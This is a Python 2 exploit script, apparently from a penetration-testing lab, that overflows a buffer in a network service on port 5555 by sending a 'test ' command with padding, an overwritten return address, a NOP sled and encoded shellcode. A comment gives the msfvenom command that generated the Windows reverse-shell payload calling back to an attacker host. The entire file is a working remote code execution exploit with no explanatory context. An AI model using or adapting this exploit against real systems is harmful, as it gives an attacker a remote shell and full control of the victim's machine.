#!/usr/bin/python
import sys
import socket

# found bad chars- \x00
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.167 LPORT=4455 EXITFUNC=thread -f c -a x86 -b "\x00"
overflow = (
	"\xdd\xc4\xd9\x74\x24\xf4\x58\xbe\xbb\xef\xe7\x86\x31\xc9\xb1"
	"\x52\x83\xc0\x04\x31\x70\x13\x03\xcb\xfc\x05\x73\xd7\xeb\x48"
	"\x7c\x27\xec\x2c\xf4\xc2\xdd\x6c\x62\x87\x4e\x5d\xe0\xc5\x62"
	"\x16\xa4\xfd\xf1\x5a\x61\xf2\xb2\xd1\x57\x3d\x42\x49\xab\x5c"
	"\xc0\x90\xf8\xbe\xf9\x5a\x0d\xbf\x3e\x86\xfc\xed\x97\xcc\x53"
	"\x01\x93\x99\x6f\xaa\xef\x0c\xe8\x4f\xa7\x2f\xd9\xde\xb3\x69"
	"\xf9\xe1\x10\x02\xb0\xf9\x75\x2f\x0a\x72\x4d\xdb\x8d\x52\x9f"
	"\x24\x21\x9b\x2f\xd7\x3b\xdc\x88\x08\x4e\x14\xeb\xb5\x49\xe3"
	"\x91\x61\xdf\xf7\x32\xe1\x47\xd3\xc3\x26\x11\x90\xc8\x83\x55"
	"\xfe\xcc\x12\xb9\x75\xe8\x9f\x3c\x59\x78\xdb\x1a\x7d\x20\xbf"
	"\x03\x24\x8c\x6e\x3b\x36\x6f\xce\x99\x3d\x82\x1b\x90\x1c\xcb"
	"\xe8\x99\x9e\x0b\x67\xa9\xed\x39\x28\x01\x79\x72\xa1\x8f\x7e"
	"\x75\x98\x68\x10\x88\x23\x89\x39\x4f\x77\xd9\x51\x66\xf8\xb2"
	"\xa1\x87\x2d\x14\xf1\x27\x9e\xd5\xa1\x87\x4e\xbe\xab\x07\xb0"
	"\xde\xd4\xcd\xd9\x75\x2f\x86\xef\x82\x2f\xf1\x98\x96\x2f\xec"
	"\x3f\x1e\xc9\x64\xd0\x76\x42\x11\x49\xd3\x18\x80\x96\xc9\x65"
	"\x82\x1d\xfe\x9a\x4d\xd6\x8b\x88\x3a\x16\xc6\xf2\xed\x29\xfc"
	"\x9a\x72\xbb\x9b\x5a\xfc\xa0\x33\x0d\xa9\x17\x4a\xdb\x47\x01"
	"\xe4\xf9\x95\xd7\xcf\xb9\x41\x24\xd1\x40\x07\x10\xf5\x52\xd1"
	"\x99\xb1\x06\x8d\xcf\x6f\xf0\x6b\xa6\xc1\xaa\x25\x15\x88\x3a"
	"\xb3\x55\x0b\x3c\xbc\xb3\xfd\xa0\x0d\x6a\xb8\xdf\xa2\xfa\x4c"
	"\x98\xde\x9a\xb3\x73\x5b\xba\x51\x51\x96\x53\xcc\x30\x1b\x3e"
	"\xef\xef\x58\x47\x6c\x05\x21\xbc\x6c\x6c\x24\xf8\x2a\x9d\x54"
	"\x91\xde\xa1\xcb\x92\xca"
	)

# 65d11d71 = \x71\x1d\xd1\x65
crash = "A" * 1040 + "\x71\x1d\xd1\x65" + "\x90" * 15 + overflow
shellcode = 'test ' + crash + '\r\n'

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.11.23.92',5555))
	message=shellcode
	s.send(message)
	s.close()

except:
	print "Error connecting to remote machine."
	sys.exit() 